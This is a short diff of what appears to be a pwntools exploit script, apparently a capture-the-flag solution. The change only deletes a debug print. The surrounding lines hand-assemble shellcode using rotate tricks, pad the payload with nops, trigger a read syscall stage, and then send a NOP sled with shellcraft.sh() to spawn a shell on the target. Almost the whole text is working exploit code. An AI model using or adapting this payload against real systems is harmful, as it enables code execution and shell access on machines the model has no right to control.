@@ -23,9 +23,6 @@ p += asm( 'mov rax, 0x909090909090bc54' )  # 0x5e pop rsi : 0xbc ror 1 -> 0x5e
 p += asm( 'ror ah, 1' )
 p += asm( 'push rax' )
 
-
-print hex( len( p ) )
-
 y.send( p.ljust( 0x440 , asm( 'nop' ) ) + '\x10\x10\x10\x10' ) # read syscall
 
 y.send( '\x90' * 0x100 +  asm( shellcraft.sh() ) ) # shellcode
